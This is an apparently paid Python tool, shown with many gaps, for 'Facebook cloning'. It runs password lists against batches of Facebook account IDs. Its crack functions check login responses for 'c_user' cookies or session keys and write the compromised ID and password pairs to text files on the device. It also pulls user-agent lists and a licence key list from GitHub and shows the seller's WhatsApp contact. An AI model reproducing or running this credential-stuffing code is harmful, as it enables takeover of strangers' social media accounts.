#Jai Shri Ram , Source Code By = ARSHAD ALI
#Fuck MAFIA Kidzz 
...
cx=('.g');cxx=('fig');xl=('/')
import os,base64
os.system("xdg-open   https://www.facebook.com/groups/1019438809278459/?ref=share")
...
try:
    ...
    os.system('python cid.py')
android_models=[]
try:
    xx = requests.get('https://github.com/ARSHAD ALI/CID/blob/main/UAGNT.txt').text.splitlines()
    for line in xx:
...
usr=[]
try:
    xd=requests.get('https://github.com/ARSHAD ALI/CID/blob/main/UAGNT.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
pyt=('python3.11')
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/ARSHAD ALI/CID/blob/main/UAGNT.txt').text
        ua=open('.bbnew.txt','w')
...
╚═════╝░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝
\033[1;93m--------------------------------------------------
\033[1;37m[-] Owner    :\033[1;32m ARSHAD ALI 
\033[1;37m[-] WhatsApp     :\033[1;32m +923422510361
\033[1;37m[-] Best Friend   :\033[1;32m Wahid Bux Laghari
\033[1;37m[-] STATUS    :\033[1;32m PREMIUM
--------------------------------------------------
\033[1;37m[-]Dear Paid user:
\033[1;37m[-]Be Happy ðŸ˜Š , Stay Positive ðŸ˜‹
--------------------------------------------------""")
def linex():
    print('\033[1;32m----------------------------------------------')
def clear():
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/CID.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/CID.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/CID.txt\033[0;97m')
...
def menu(): 
    ...
    if xd in ['1','01']:
       ...
       gmail()
        ...
        os.system(f'xdg-open https://wa.me/+923422510361');menu()
...
def gmail():
        ...
        clear()
        print('\033[1;32m example: ARSHAD, ali, Wahid Bux, Kashif , Altaf\033[1;97m')
        linex()
...
def ffb(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write('\r\r\033[1;32m [CID] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if "c_user" in AXI:
                ...
                print('\r\r\033[1;32m [CID-Ok] %s | %s'%(ids,pas))
                open('/sdcard/CID-Ok.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in AXI:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m [CID-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/CID-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
...
def rcrack1(ids,passlist):
    ...
    try:
        for pas in passlist:
            ...
            if 'session_key' in q:
                udx = str(q['uid'])
                print('\r\r\033[1;32m [CID-Ok] '+udx+' | '+pas+'\033[1;97m')
                open('/sdcard/CID-Ok.txt', 'a').write(udx+'|'+pas+'\n')
                oks.append(ids)
                break
...
def rcrack(ids,passlist):
    ...
    try:
        for pas in passlist:
            sys.stdout.write('\r\r\033[1;32m [CID] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
            session = requests.Session()
            ...
            if 'c_user' in log_cookies:
                ...
                if uid in oks:pass
                    ...
                    if 'checkpoint' in str(lo):
                        print('\r\r\033[1;34m [CID-TL] '+ids+' | '+pas)
                    else:
                        print(f'\r\x1b[1;32m [CID-Ok] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Rashid118/Lion/blob/main/Lion.txtt').text
...
╚═════╝░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝                      
 \033[1;93m=================================================
\033[1;37m[-] Owner    :\033[1;32mARSHAD ALI 
\033[1;37m[-] Cast    :\033[1;32mLaghari
\033[1;37m[-] WhatsApp  :\033[1;32m+923422510361  
\033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
\033[1;37m[-] Best Friend   :\033[1;32mWahid Bux Laghari
\033[1;37m[-] STATUS    :\033[1;32m PAID
==================================================
\033[1;33m[*]TOOLS  : Facebook cloning
\033[1;37m[*]Status : PAID
==================================================
 \33[37;41m\t This clone owner ARSHAD LAGHARI\33[0;m
\033[1;93m=================================================
...
==================================================   """)
  ...
  os.system('xdg-open https://wa.me/+923422510361')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Rashid118/Lion/blob/main/Lion.txt").text
    if id in httpCaht:
      ...
      print("\x1b[1;97m    Sorry Bro Token Key not AprovedÃ°Å¸Ëœâ€œ")
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/Rashid118/Lion/blob/main/Lion.txt').text
